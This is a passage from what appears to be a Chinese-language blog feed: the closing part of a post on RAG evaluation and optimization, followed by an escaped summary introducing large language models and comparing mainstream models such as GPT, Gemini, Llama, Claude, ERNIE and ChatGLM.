归一化折损累积增益，用于评估检索结果的排序质量。</p></li><li><p><strong>答案相关性 (Answer Relevance):</strong> 评估 LLM 生成的答案与用户问题的相关程度。 可以使用人工评估或自动评估方法 (例如使用 ROUGE, BLEU 等指标)。</p></li><li><p><strong>答案忠实度 (Answer Faithfulness/Factuality):</strong> 评估 LLM 生成的答案与检索到的文档信息的一致性。 可以使用事实性检测模型或人工评估。</p></li><li><p><strong>答案完整性 (Answer Completeness):</strong> 评估 LLM 生成的答案是否充分回答了用户问题。</p></li><li><p><strong>用户满意度 (User Satisfaction):</strong> 使用用户调查问卷或用户行为数据 (例如点击率、停留时间) 评估用户对 RAG 系统的满意度。</p></li></ul></li></ul></li><li><p><strong>7.2 进行评估实验 (Evaluation Experimentation):</strong></p><ul><li><p><strong>构建评估数据集:</strong> 准备包含用户问题、标准答案和相关文档片段的评估数据集。</p></li><li><p><strong>自动化评估流程:</strong> 编写脚本或使用评估工具自动化 RAG 系统的评估流程。</p></li><li><p><strong>对比实验:</strong> 对比不同 RAG 配置 (例如不同的分块策略、Embedding 模型、检索策略、Prompt 工程) 的性能，找出最佳配置。</p></li><li><p><strong>消融实验:</strong> 分析不同优化策略对 RAG 精度提升的贡献度，例如分别评估数据清洗、分块策略优化、Embedding 模型优化等策略的效果。</p></li><li><p><strong>错误分析:</strong> 分析 RAG 系统的错误案例，找出系统的不足之处，并针对性地进行改进。</p></li></ul></li><li><p><strong>7.3 迭代优化 (Iterative Optimization):</strong></p><ul><li><p><strong>持续迭代优化 RAG 系统:</strong> RAG 精度提升是一个持续迭代优化的过程。 根据评估结果，不断调整和优化 RAG 系统的各个环节。</p></li><li><p><strong>A/B 测试 (A/B Testing):</strong> 尝试不同的优化策略，进行 A/B 测试，比较不同策略的效果，选择最佳策略。</p></li><li><p><strong>监控系统性能:</strong> 定期监控 RAG 系统的性能指标 (例如检索时间、答案生成时间、精度指标)，及时发现和解决性能问题。</p></li><li><p><strong>用户反馈收集:</strong> 收集用户对 RAG 系统的反馈意见，了解用户需求和痛点，并根据用户反馈进行改进。</p></li></ul></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;什么是大语言模型？&quot;&gt;&lt;a href=&quot;#什么是大语言模型？&quot; class=&quot;headerlink&quot; title=&quot;什么是大语言模型？&quot;&gt;&lt;/a&gt;什么是大语言模型？&lt;/h1&gt;&lt;p&gt;大语言模型（LLM）是一种 人工智能模型，它被设计用来 理解和生成人类语言。 关键在于 “大” 和 “语言模型” 这两个词：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;“大” (Large): 指的是模型具有 庞大的规模，主要体现在两个方面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;大规模的训练数据： LLM 是在海量的文本数据上训练出来的，这些数据通常包括互联网上的文本、书籍、文章、代码等等，数量级可以达到 TB 甚至 PB 级别。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;大规模的参数量： 模型的内部结构（通常是基于 Transformer 架构的神经网络）拥有数亿、数十亿甚至数千亿的参数。参数越多，模型理论上可以学习和存储的信息就越多，能力也更强。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;“语言模型” (Language Model): 指的是模型的核心任务是 预测文本序列的概率分布。 简单来说，给定一段文本（例如，句子的一部分），语言模型的目标是预测接下来最有可能出现的词语。 虽然目标看似简单，但为了做好这个预测，模型必须学习到语言的各种规律，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;语法规则： 词语的正确排列顺序，句子的结构。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;语义信息： 词语和句子的含义，上下文的理解。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;世界知识： 模型通过学习大量文本，间接地学习到了关于世界的知识。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;语用信息： 语言在不同情境下的使用方式，风格，语气等等。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总的来说，LLM 就是通过学习海量文本数据，拥有了理解和生成人类语言能力的超大规模神经网络模型。&lt;/p&gt;
&lt;h2 id=&quot;人工智能常见领域&quot;&gt;&lt;a href=&quot;#人工智能常见领域&quot; class=&quot;headerlink&quot; title=&quot;人工智能常见领域&quot;&gt;&lt;/a&gt;人工智能常见领域&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;计算机视觉 (CV)：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;图像分类、目标检测、图像分割、图像生成&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;常用模型：ResNet、YOLO、Mask R-CNN、GANs&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;自然语言处理 (NLP)：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;文本分类、情感分析、机器翻译、文本生成、问答系统&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;常用模型：Word2Vec、GloVe、BERT、Transformer、GPT&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;语音识别 (ASR)：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;语音转文本、语音合成&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;常用模型：DeepSpeech、Wav2Vec&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;推荐系统：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;协同过滤、基于内容的推荐、混合推荐&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强化学习 (RL)：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;马尔可夫决策过程 (MDP)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Q-learning、Deep Q-Network (DQN)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;策略梯度&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;应用场景：推荐系统、金融交易、游戏等&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;时间序列分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;应用场景：预测股票价格、汇率走势和市场趋势、预测天气变化和气候变化预测交通流量和路况等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;主流AI大模型&quot;&gt;&lt;a href=&quot;#主流AI大模型&quot; class=&quot;headerlink&quot; title=&quot;主流AI大模型&quot;&gt;&lt;/a&gt;主流AI大模型&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;一、 文本生成与理解类模型 (以自然语言处理为主)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;1. OpenAI GPT 系列 (GPT-3, GPT-3.5, GPT-4, GPT-4 Turbo等)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; OpenAI&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Decoder-only Transformer (自回归模型)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 海量的文本和代码数据，包括互联网文本、书籍、代码库等，规模庞大且质量高。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的文本生成能力:&lt;/strong&gt; 在文本生成、代码生成、创意写作、对话等方面表现卓越，生成文本流畅自然，逻辑连贯。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;上下文学习 (In-context Learning):&lt;/strong&gt; 能够根据Prompt (提示词) 中的少量示例快速适应新任务，无需针对特定任务进行微调。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;指令遵循能力 (Instruction Following):&lt;/strong&gt; 经过指令微调 (Instruction Tuning) 后，能更好地理解和执行用户指令，并生成符合指令的输出。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多模态能力 (GPT-4):&lt;/strong&gt; GPT-4 具备处理图像输入的能力，可以进行图像描述、视觉问答等任务，是真正的多模态大模型。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;持续进化:&lt;/strong&gt; OpenAI 不断迭代和更新 GPT 系列模型，性能持续提升，例如 GPT-4 Turbo 拥有更长的上下文窗口，更低的API价格。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;顶尖的文本生成质量和理解能力。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的通用性和泛化能力，适用范围广泛。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;成熟的 API 服务和生态系统，易于集成和使用。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;持续创新和迭代，性能不断提升。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;API 访问成本相对较高 (特别是 GPT-4)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型细节和训练数据相对封闭 (特别是 GPT-4)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;有时会产生幻觉 (Hallucination)，即生成不真实或与事实不符的内容。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;在某些特定领域或专业任务上，可能不如领域特定模型。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;对 Prompt 工程依赖性较高，需要精心设计 Prompt 才能发挥最佳性能。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;2. Google PaLM 系列 (PaLM 2, Gemini 等)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; Google&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Decoder-only Transformer (PaLM 2)，Transformer-based (Gemini)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 海量的文本和代码数据，规模庞大，并侧重于高质量、多语言和多领域数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的多语言能力:&lt;/strong&gt; PaLM 2 在多语言理解和生成方面表现突出，支持超过100种语言。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的推理能力:&lt;/strong&gt; Gemini 系列模型 (特别是 Gemini Ultra) 在多项基准测试中表现出色，展现了强大的推理和理解能力，尤其在数学、逻辑推理等方面。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多模态原生支持 (Gemini):&lt;/strong&gt; Gemini 从设计之初就考虑了多模态，能够原生处理文本、图像、音频、视频等多种模态的数据，实现真正的多模态理解和生成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Google 生态集成:&lt;/strong&gt; 与 Google 搜索、Android 系统、Google Cloud 等生态系统深度集成，应用潜力巨大。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;顶尖的多语言能力和强大的推理能力 (特别是 Gemini)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;原生多模态支持 (Gemini)，具有广阔的应用前景。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;背靠 Google 强大的技术实力和生态系统。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;持续发展和迭代，Gemini 系列模型有望成为 GPT 系列的强有力竞争者。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;API 访问和生态系统相对 GPT 系列稍逊 (但正在快速发展)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Gemini Ultra 的访问权限目前较为受限。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型细节和训练数据相对封闭。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;在某些特定任务上，可能需要进一步优化和微调。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;3. Meta Llama 系列 (Llama 2, Llama 3 等)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; Meta (原 Facebook)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Decoder-only Transformer (Llama 2)，Transformer-based (Llama 3)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 大规模的公开可用的文本数据，侧重于透明度和可复现性。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开源和可商用:&lt;/strong&gt; Llama 2 系列模型开源且允许商业用途，降低了使用门槛，促进了社区发展。 Llama 3 延续开源策略。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;性能接近甚至在某些方面超越 GPT-3.5:&lt;/strong&gt; Llama 2 在某些基准测试中表现出色，性能接近甚至在某些方面超越了 GPT-3.5。 Llama 3 更进一步，性能更强大。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多种尺寸版本:&lt;/strong&gt; 提供多种参数规模的版本 (7B, 13B, 70B 等)，满足不同资源和应用场景的需求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;社区支持和生态快速发展:&lt;/strong&gt; 开源特性吸引了大量开发者和研究者参与，社区活跃，生态系统快速发展，涌现出各种基于 Llama 的应用和工具。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开源和可商用，极大降低了使用门槛。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;高性能，在某些方面可媲美甚至超越闭源模型 (如 GPT-3.5)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多种尺寸版本，灵活性高。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的社区支持和活跃的生态系统。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;性能上整体相比 GPT-4 和 Gemini 仍有差距 (但 Llama 3 正在缩小差距)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;在某些复杂任务或多模态任务上，能力相对较弱。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开源模型需要一定的技术能力进行部署和维护。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;4. Anthropic Claude 系列 (Claude 2, Claude 3 等)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; Anthropic&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Transformer-based (Claude 2, Claude 3)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 大规模的文本和代码数据，侧重于安全性和负责任的AI开发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强调安全和负责任的AI:&lt;/strong&gt; Anthropic 致力于开发安全、可靠、对人类有益的AI模型，Claude 系列模型在安全性方面进行了特别设计和优化。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;长上下文窗口:&lt;/strong&gt; Claude 2 拥有超长的上下文窗口 (100K tokens, Claude 3 Opus 达到 200K tokens)，能够处理更长的文本输入，例如整本书籍或长篇文档。 Claude 3 Sonnet 和 Haiku 的上下文窗口也达到 200K tokens。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的理解和推理能力:&lt;/strong&gt; Claude 3 Opus 在复杂推理、数学、代码生成等方面表现出色，在某些基准测试中甚至超越了 GPT-4 和 Gemini Ultra。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多种版本 (Claude 3):&lt;/strong&gt; Claude 3 系列提供 Opus (最强性能)、Sonnet (性能和速度平衡)、Haiku (最快速度和低成本) 三个版本，满足不同需求。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强调安全和负责任的AI开发理念。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;超长的上下文窗口，擅长处理长文本输入。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的理解和推理能力 (特别是 Claude 3 Opus)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Claude 3 系列提供多种版本，选择更灵活。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;API 访问和生态系统相对 GPT 系列和 Google 稍弱。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型细节和训练数据相对封闭。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;在某些任务上，例如代码生成，可能不如专门的代码生成模型。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;5. Baidu ERNIE 系列 (ERNIE 3.0 Titan, ERNIE Bot 4.0 等)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; 百度&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Transformer-based (ERNIE 3.0 Titan, ERNIE Bot 4.0)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 大规模中文和英文文本数据，侧重于中文理解和生成能力。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的中文理解和生成能力:&lt;/strong&gt; ERNIE 系列模型在中文 NLP 任务上表现出色，尤其在中文文本生成、中文问答、中文信息检索等方面。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;知识增强 (Knowledge Enhanced):&lt;/strong&gt; ERNIE 模型融入了知识图谱等知识信息，增强了模型的知识理解和推理能力。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多任务学习:&lt;/strong&gt; ERNIE 模型采用多任务学习框架进行训练，提升了模型的通用性和泛化能力。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;百度生态集成:&lt;/strong&gt; 与百度搜索、百度智能云等生态系统深度集成，应用场景广泛。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;顶尖的中文理解和生成能力，在中文 NLP 领域具有优势。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;知识增强，提升了知识理解和推理能力。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;百度生态集成，应用场景广泛。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;针对中文市场和用户进行了优化。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;英文能力相对 GPT 系列和 Google 等模型稍弱。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型细节和训练数据相对封闭。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;国际化程度相对较低，主要服务于中文市场。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;6. 清华大学 ChatGLM 系列 (ChatGLM3 等)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; 清华大学 KEG 实验室&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Transformer-based (ChatGLM3)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 大规模中英文文本数据，侧重于开源和研究。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开源和免费可商用 (部分版本):&lt;/strong&gt; ChatGLM3 部分版本开源且免费可商用，降低了使用门槛，促进了学术研究和商业应用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的中文能力:&lt;/strong&gt; ChatGLM 系列模型在中文 NLP 任务上表现出色，尤其在中文对话、中文问答等方面。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;轻量化版本 (ChatGLM3-6B):&lt;/strong&gt; 提供轻量化版本 (ChatGLM3-6B)，资源需求较低，可以在消费级硬件上部署和运行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;插件机制 (Tool API):&lt;/strong&gt; ChatGLM3 提供了 Tool API，允许模型调用外部工具，扩展了模型的功能。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开源和免费可商用 (部分版本)，便于研究和应用。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的中文能力，尤其在中文对话领域。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;轻量化版本，资源需求低，易于部署。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;插件机制，扩展了模型的功能。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;英文能力相对 GPT 系列和 Google 等模型稍弱。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型规模相对较小，整体性能相比顶尖闭源模型仍有差距 (但轻量化和开源是其优势)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;生态系统和社区规模相对较小 (但正在快速发展)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;7. 智谱 AI ChatYuan 系列 (ChatYuan-Large 等)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; 智谱 AI&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Transformer-based (ChatYuan-Large)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 大规模中英文文本数据，侧重于中文通用能力。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的中文通用能力:&lt;/strong&gt; ChatYuan 系列模型在中文通用能力方面表现出色，适用于多种中文 NLP 任务。&lt;/p&gt;
&lt;/li&gt;
